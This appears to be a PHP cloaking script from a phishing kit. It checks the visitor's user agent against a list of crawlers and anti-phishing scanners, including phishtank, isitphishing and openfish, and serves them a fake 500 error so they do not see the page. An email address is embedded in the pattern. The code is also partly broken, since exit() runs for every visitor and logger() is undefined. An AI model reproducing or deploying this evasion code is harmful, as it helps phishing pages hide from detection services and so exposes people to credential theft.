<?php

if(preg_match('/bot|crawler|spider|facebook|alexa|twitter|curl|google|phishtank|isitphishing|openfish|AhrefsBot|Baiduspider|EasouSpider|Ezooms|YandexBot|MJ12bot|MJ12bot|HTTrack|tineye|almaden| Anarchie| ASPSeek| attach| autoemailspider| BackWeb| Bandit| BatchFTP| BlackWidow| Bot\ mailto:bibo7ayoub@gmail.com| Buddy| bumblebee| CherryPicker| ChinaClaw| CICC| Collector| Copier| Crescent| Custo| DA| DIIbot| DISCo| DISCo\ Pump| Download\ Demon| Download\ Wonder| Downloader| Drip| DSurf15a| eCatch| EasyDL/2.99| EirGrabber| EmailCollector| EmailSiphon| InterGET| InternetLinkagent| InternetSeer.com| URLSpiderPro| Surfbot| Superbot| Web\ Image\ Collector| Xaldon\ WebSpider/i', $_SERVER['HTTP_USER_AGENT'])) {
    logger("[BOT] {$_SERVER['REQUEST_URI']} - 500");

    header('HTTP/1.1 500 Internal Server Error');
}
	
    exit();


?>